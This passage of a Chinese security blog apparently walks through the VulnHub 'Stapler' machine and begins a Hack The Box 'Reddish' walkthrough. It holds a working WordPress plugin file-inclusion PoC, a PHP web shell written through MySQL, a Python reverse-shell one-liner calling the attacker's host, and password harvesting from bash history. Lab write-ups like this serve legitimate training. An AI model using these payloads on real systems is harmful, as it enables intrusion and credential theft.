http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=random&amp;short=1&amp;term=1&amp;thumb=[FILEPATH]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit - Print the content of wp-config.php in terminal (default Wordpress config)</span></span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">import urllib2</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/wordpress&quot;</span> <span class="comment"># insert url to wordpress</span></span><br><span class="line"></span><br><span class="line">randomID = long(random.random() * 100000000000000000L)</span><br><span class="line"></span><br><span class="line">objHtml = urllib2.urlopen(url + <span class="string">&#x27;/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=&#x27;</span> + str(randomID) + <span class="string">&#x27;&amp;short=rnd&amp;term=rnd&amp;thumb=../wp-config.php&#x27;</span>)</span><br><span class="line">content =  objHtml.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        numbers = re.findall(r<span class="string">&#x27;\d+&#x27;</span>,line)</span><br><span class="line">        id = numbers[-1]</span><br><span class="line">        id = int(id) / 10</span><br><span class="line"></span><br><span class="line">objHtml = urllib2.urlopen(url + <span class="string">&#x27;/?p=&#x27;</span> + str(id))</span><br><span class="line">content = objHtml.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;attachment-post-thumbnail size-post-thumbnail wp-post-image&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">                urls=re.findall(<span class="string">&#x27;&quot;(https?://.*?)&quot;&#x27;</span>, line)</span><br><span class="line">                <span class="built_in">print</span> urllib2.urlopen(urls[0]).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure>

<p>修改poc中的ip和文件夹保存后运行poc，下面是修改后的poc脚本内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line">import urllib2</span><br><span class="line">import re</span><br><span class="line">import ssl</span><br><span class="line"></span><br><span class="line">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class="line">url = <span class="string">&quot;https://192.168.56.122:12380/blogblog&quot;</span> <span class="comment"># insert url to wordpress</span></span><br><span class="line"></span><br><span class="line">randomID = long(random.random() * 100000000000000000L)</span><br><span class="line"></span><br><span class="line">objHtml = urllib2.urlopen(url + <span class="string">&#x27;/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=&#x27;</span> + str(randomID) + <span class="string">&#x27;&amp;short=rnd&amp;term=rnd&amp;thumb=../wp-config.php&#x27;</span>)</span><br><span class="line">content =  objHtml.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">    numbers = re.findall(r<span class="string">&#x27;\d+&#x27;</span>,line)</span><br><span class="line">    id = numbers[-1]</span><br><span class="line">    id = int(id) / 10</span><br><span class="line"></span><br><span class="line">objHtml = urllib2.urlopen(url + <span class="string">&#x27;/?p=&#x27;</span> + str(id))</span><br><span class="line">content = objHtml.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;attachment-post-thumbnail size-post-thumbnail wp-post-image&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">        urls=re.findall(<span class="string">&#x27;&quot;(https?://.*?)&quot;&#x27;</span>, line)</span><br><span class="line">        <span class="built_in">print</span> urllib2.urlopen(urls[0]).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure>

<p>运行poc后没有任何输出，但是在<span class="exturl" data-url="aHR0cHM6Ly8xOTIuMTY4LjU2LjEyMjoxMjM4MC9ibG9nYmxvZy93cC1jb250ZW50L3VwbG9hZHMvJUU3JTlCJUFFJUU1JUJEJTk1JUU0JUI4JThCJUU2JTk2JUIwJUU1JUEyJTlFJUU0JUJBJTg2JUU0JUI4JTgwJUU0JUI4JUFBOTU3NTUwMTcyLmpwZWclRTYlOTYlODclRTQlQkIlQjYlRUYlQkMlOEMlRTQlQjglOEIlRTglQkQlQkQlRTYlQUQlQTQlRTYlOTYlODclRTQlQkIlQjYlRTUlQjklQjYlRTYlOUYlQTUlRTclOUMlOEIlRTklODclOEMlRTklOUQlQTIlRTclOUElODQlRTUlODYlODUlRTUlQUUlQjk=">https://192.168.56.122:12380/blogblog/wp-content/uploads/目录下新增了一个957550172.jpeg文件，下载此文件并查看里面的内容<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/stapler-1<span class="comment"># cat 957550172.jpeg </span></span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configurations of the WordPress.</span><br><span class="line"> *</span><br><span class="line"> * This file has the following configurations: MySQL settings, Table Prefix,</span><br><span class="line"> * Secret Keys, and ABSPATH. You can find more information by visiting</span><br><span class="line"> * &#123;@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php&#125;</span><br><span class="line"> * Codex page. You can get the MySQL settings from your web host.</span><br><span class="line"> *</span><br><span class="line"> * This file is used by the wp-config.php creation script during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can just copy this file</span></span><br><span class="line"><span class="string"> * to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>wordpress<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>root<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database password */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>plbkac<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL hostname */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_HOST<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_CHARSET<span class="string">&#x27;, &#x27;</span>utf8mb4<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** The Database Collate type. Don&#x27;</span>t change this <span class="keyword">if</span> <span class="keyword">in</span> doubt. */</span><br><span class="line">define(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@+</span></span><br><span class="line"> * Authentication Unique Keys and Salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases!</span><br><span class="line"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="line"> * You can change these at any point <span class="keyword">in</span> time to invalidate all existing cookies. This will force all users to have to <span class="built_in">log</span> <span class="keyword">in</span> again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define(<span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;V 5p=[.Vds8~SX;&gt;t)++Tt57U6&#123;Xe`T|oW^eQ!mHr &#125;]&gt;9RX07W&lt;sZ,I~`6Y5-T:&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;vJZq=p.Ug,]:&lt;-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+&#125;&amp;!/#&gt;4#K7eFP5-av`n)2&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;ql-Vfg[?v6&#123;ZR*+O)|Hf OpPWYfKX0Jmpl8zU&lt;cr.wm?|jqZH:YMv;zu@tM7P:4o&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;j|V8J.~n&#125;R2,mlU%?C8o2[~6Vo1&#123;Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;I&#123;gDlDs`Z@.+/AdyzYw4%+&lt;WsO-LDBHT&#125;&gt;&#125;!||Xrf@1E6jJNV=&#123;p1?yMKYec*OI$&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;.HJmx^zb];5P&#125;hM-uJ%^+9=0SBQEh[[*&gt;#z+p&gt;nVi10`XOUq (Zml~op3SG4OG_D&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&amp;_nP4&#123;D&#125;n=y=FQt%zJw&gt;c[a+;ppCzIkt;&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;tb(&#125;BfgB7l!rhDVm&#123;eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each a unique</span><br><span class="line"> * prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span>  = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> */</span><br><span class="line">define(<span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy blogging. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( !defined(&#x27;</span>ABSPATH<span class="string">&#x27;) )</span></span><br><span class="line"><span class="string">        define(&#x27;</span>ABSPATH<span class="string">&#x27;, dirname(__FILE__) . &#x27;</span>/<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once(ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">define(&#x27;</span>WP_HTTP_BLOCK_EXTERNAL<span class="string">&#x27;, true);</span></span><br></pre></td></tr></table></figure>

<p>找到mysql数据库的账号和密码：root/plbkac，接下来连接数据库</p>
<p>首先猜测网站绝对路径如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MySQL [wordpress]&gt; select load_file(<span class="string">&#x27;/var/www/https/robots.txt&#x27;</span>);</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">| load_file(<span class="string">&#x27;/var/www/https/robots.txt&#x27;</span>)                      |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">| User-agent: *</span><br><span class="line">Disallow: /admin112233/</span><br><span class="line">Disallow: /blogblog/</span><br><span class="line"> |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>使用以下myssql语句写入木马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MySQL [wordpress]&gt; Select <span class="string">&quot;&lt;?php echo shell_exec(<span class="variable">$_GET</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span> into outfile <span class="string">&quot;/var/www/https/blogblog/wp-content/uploads/shell.php&quot;</span>;</span><br><span class="line">Query OK, 1 row affected (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>成功写入木马并能执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://192.168.56.122:12380/blogblog/wp-content/uploads/shell.php?cmd=id</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub253.jpg"></li>
</ul>
<p>现在执行下面命令来反弹一个shell</p>
<p>浏览器执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://192.168.56.122:12380/blogblog/wp-content/uploads/shell.php?cmd=python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.102&quot;,5566));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>kali端，成功的弹回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.122: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.122] 54522</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/var/www/https/blogblog/wp-content/uploads</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty;pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">www-data@red:/var/www/https/blogblog/wp-content/uploads$ id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">www-data@red:/var/www/https/blogblog/wp-content/uploads$ whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br></pre></td></tr></table></figure>

<p>使用下面的命令尝试找出ssh的账号密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@red:/$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line">www-data@red:/$ find -name <span class="string">&quot;.bash_history&quot;</span> -<span class="built_in">exec</span> cat &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">find -name <span class="string">&quot;.bash_history&quot;</span> -<span class="built_in">exec</span> cat &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">...</span><br><span class="line">sshpass -p thisimypassword ssh JKanode@localhost</span><br><span class="line">apt-get install sshpass</span><br><span class="line">sshpass -p JZQuyIN5 peter@localhost</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>发现下面两个账号密码均能成功登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">JKanode    thisimypassword</span><br><span class="line">peter      JZQuyIN5</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh JKanode@192.168.56.122</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.122 (192.168.56.122)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.56.122<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">-----------------------------------------------------------------</span></span><br><span class="line"><span class="string">~          Barry, don&#x27;</span>t forget to put a message here           ~</span><br><span class="line">-----------------------------------------------------------------</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">JKanode@192.168.56.122<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome back!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Ubuntu system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span></span><br><span class="line"><span class="string">applicable law.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">JKanode@red:~$ id</span></span><br><span class="line"><span class="string">uid=1013(JKanode) gid=1013(JKanode) groups=1013(JKanode)</span></span><br><span class="line"><span class="string">JKanode@red:~$ whoami</span></span><br><span class="line"><span class="string">JKanode</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh peter@192.168.56.122</span></span><br><span class="line">-----------------------------------------------------------------</span><br><span class="line">~          Barry, don<span class="string">&#x27;t forget to put a message here           ~</span></span><br><span class="line"><span class="string">-----------------------------------------------------------------</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">peter@192.168.56.122&#x27;</span>s password: </span><br><span class="line">Welcome back!</span><br><span class="line"></span><br><span class="line">This is the Z Shell configuration <span class="keyword">function</span> <span class="keyword">for</span> new users,</span><br><span class="line">zsh-newuser-install.</span><br><span class="line">You are seeing this message because you have no zsh startup files</span><br><span class="line">(the files .zshenv, .zprofile, .zshrc, .zlogin <span class="keyword">in</span> the directory</span><br><span class="line">~).  This <span class="keyword">function</span> can <span class="built_in">help</span> you with a few settings that should</span><br><span class="line">make your use of the shell easier.</span><br><span class="line"></span><br><span class="line">You can:</span><br><span class="line"></span><br><span class="line">(q)  Quit and <span class="keyword">do</span> nothing.  The <span class="keyword">function</span> will be run again next time.</span><br><span class="line"></span><br><span class="line">(0)  Exit, creating the file ~/.zshrc containing just a comment.</span><br><span class="line">     That will prevent this <span class="keyword">function</span> being run again.</span><br><span class="line"></span><br><span class="line">(1)  Continue to the main menu.</span><br><span class="line"></span><br><span class="line">(2)  Populate your ~/.zshrc with the configuration recommended</span><br><span class="line">     by the system administrator and <span class="built_in">exit</span> (you will need to edit</span><br><span class="line">     the file by hand, <span class="keyword">if</span> so desired).</span><br><span class="line"></span><br><span class="line">--- Type one of the keys <span class="keyword">in</span> parentheses ---</span><br><span class="line">Aborting.</span><br><span class="line">The <span class="keyword">function</span> will be run again next time.  To prevent this, execute:</span><br><span class="line">  touch ~/.zshrc</span><br><span class="line">red%</span><br><span class="line">red% id</span><br><span class="line">uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)</span><br><span class="line">red% whoami</span><br><span class="line">peter</span><br></pre></td></tr></table></figure>

<p>执行下面的命令利用peter用户提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">red% sudo usermod -s /bin/bash</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the <span class="built_in">local</span> System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> peter: </span><br><span class="line">Usage: usermod [options] LOGIN</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -c, --comment COMMENT         new value of the GECOS field</span><br><span class="line">  -d, --home HOME_DIR           new home directory <span class="keyword">for</span> the user account</span><br><span class="line">  -e, --expiredate EXPIRE_DATE  <span class="built_in">set</span> account expiration date to EXPIRE_DATE</span><br><span class="line">  -f, --inactive INACTIVE       <span class="built_in">set</span> password inactive after expiration</span><br><span class="line">                                to INACTIVE</span><br><span class="line">  -g, --gid GROUP               force use GROUP as new primary group</span><br><span class="line">  -G, --groups GROUPS           new list of supplementary GROUPS</span><br><span class="line">  -a, --append                  append the user to the supplemental GROUPS</span><br><span class="line">                                mentioned by the -G option without removing</span><br><span class="line">                                him/her from other groups</span><br><span class="line">  -h, --<span class="built_in">help</span>                    display this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -l, --login NEW_LOGIN         new value of the login name</span><br><span class="line">  -L, --lock                    lock the user account</span><br><span class="line">  -m, --move-home               move contents of the home directory to the</span><br><span class="line">                                new location (use only with -d)</span><br><span class="line">  -o, --non-unique              allow using duplicate (non-unique) UID</span><br><span class="line">  -p, --password PASSWORD       use encrypted password <span class="keyword">for</span> the new password</span><br><span class="line">  -R, --root CHROOT_DIR         directory to chroot into</span><br><span class="line">  -s, --shell SHELL             new login shell <span class="keyword">for</span> the user account</span><br><span class="line">  -u, --uid UID                 new UID <span class="keyword">for</span> the user account</span><br><span class="line">  -U, --unlock                  unlock the user account</span><br><span class="line">  -v, --add-subuids FIRST-LAST  add range of subordinate uids</span><br><span class="line">  -V, --del-subuids FIRST-LAST  remove range of subordinate uids</span><br><span class="line">  -w, --add-subgids FIRST-LAST  add range of subordinate gids</span><br><span class="line">  -W, --del-subgids FIRST-LAST  remove range of subordinate gids</span><br><span class="line">  -Z, --selinux-user SEUSER     new SELinux user mapping <span class="keyword">for</span> the user account</span><br><span class="line"></span><br><span class="line">red% id</span><br><span class="line">uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)</span><br><span class="line">red% whoami</span><br><span class="line">peter</span><br><span class="line">red% sudo -i</span><br><span class="line">➜  ~ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">➜  ~ whoami</span><br><span class="line">root</span><br><span class="line">➜  ~ <span class="built_in">cd</span> /root</span><br><span class="line">➜  ~ ls</span><br><span class="line">fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql</span><br><span class="line">➜  ~ cat flag.txt</span><br><span class="line">~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~</span><br><span class="line">                          .-<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;-.</span></span><br><span class="line"><span class="string">                          |&#x27;</span>-----<span class="string">&#x27;|</span></span><br><span class="line"><span class="string">                          |-.....-|</span></span><br><span class="line"><span class="string">                          |       |</span></span><br><span class="line"><span class="string">                          |       |</span></span><br><span class="line"><span class="string">         _,._             |       |</span></span><br><span class="line"><span class="string">    __.o`   o`&quot;-.         |       |</span></span><br><span class="line"><span class="string"> .-O o `&quot;-.o   O )_,._    |       |</span></span><br><span class="line"><span class="string">( o   O  o )--.-&quot;`O   o&quot;-.`&#x27;</span>-----<span class="string">&#x27;`</span></span><br><span class="line"><span class="string"> &#x27;</span>--------<span class="string">&#x27;  (   o  O    o)  </span></span><br><span class="line"><span class="string">              `----------`</span></span><br><span class="line"><span class="string">b6b545dc11b7a270f4bad23432190c75162c4a2b</span></span><br></pre></td></tr></table></figure>

<p>成功的获取到了root用户的权限并拿到了flag</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub254.jpg"></li>
</ul>
<h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><p>也可以访问wordpress数据库后然后选择用户john并破解hash值，它将是“不正确的”使用用户“john”和密码“incorrect”访问wordpress然后导航以添加插件，然后上传shell，将在/blogblog/wp-content/uploads目录中找到shell</p>
<p>使用nc作为侦听器建立连接之后，还可以使用下面的方法进行提权</p>
<ul>
<li><p>提权参考1 <span class="exturl" data-url="aHR0cHM6Ly9idWdzLmNocm9taXVtLm9yZy9wL3Byb2plY3QtemVyby9pc3N1ZXMvZGV0YWlsP2lkPTgwOA==">Linux-UAF通过bpf-BPF-PROG-LOAD-错误路径中的double-fdput<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>提权参考2 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzk3NzI=">Linux内核4.4.x-Ubuntu-16.04-double-fdput-bpf-BPF_PROG_LOAD-提权<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
<p><font color="red">其它更多方法请自行尝试。。。</font></p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>wordpress用户枚举</li>
<li>WordPress Plugin Advanced Video 1.0 - 本地文件包含</li>
<li>python poc修改</li>
<li>select load_file(‘/var/www/https/robots.txt’); mysql语句读取文件内容</li>
<li>select “php木马内容” into outfile “/var/www/https/blogblog/wp-content/uploads/shell.php”; mysql语句写入木马</li>
<li>python脚本反弹shell</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.102&quot;,5566));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>find命令寻找登录的历史ssh密码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find -name <span class="string">&quot;.bash_history&quot;</span> -<span class="built_in">exec</span> cat &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<ul>
<li>sudo -i提权</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo usermod -s /bin/bash</span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure>
<ul>
<li>Linux内核4.4.x-Ubuntu-16.04-double-fdput-bpf-BPF_PROG_LOAD-提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[reddish]</title>
    <url>/2020/07/19/reddish/</url>
    <content><![CDATA[<h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:     Linux<br>Difficulty:     Insane<br>Points:    50<br>Release: 21 Jul 2018<br>IP:    10.10.10.94</p>
<p>User Blood: 00 days, 12 hours, 36 mins, 39 seconds.<br>Root Blood: 00 days, 19 hours, 28 mins, 48 seconds.</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb46.jpg"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<a id="more"></a>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># nmap -sV -v -p- 10.10.10.94 --min-rate=10000</span></span><br><span class="line"></span><br><span class="line">PORT      STATE    SERVICE     VERSION</span><br><span class="line">1880/tcp  open     http        Node.js Express framework</span><br><span class="line">8181/tcp  filtered intermapper</span><br><span class="line">33752/tcp filtered unknown</span><br></pre></td></tr></table></figure>

<ul>
<li>NodeRed - port 1880</li>
</ul>
<p>NodeRed is a browser based editor to make flows for IoT devices and other technology to talk togetheri, and it runs on tcp 1880 by default.</p>
<p>send a POST with curl, and get back some json data:</p>
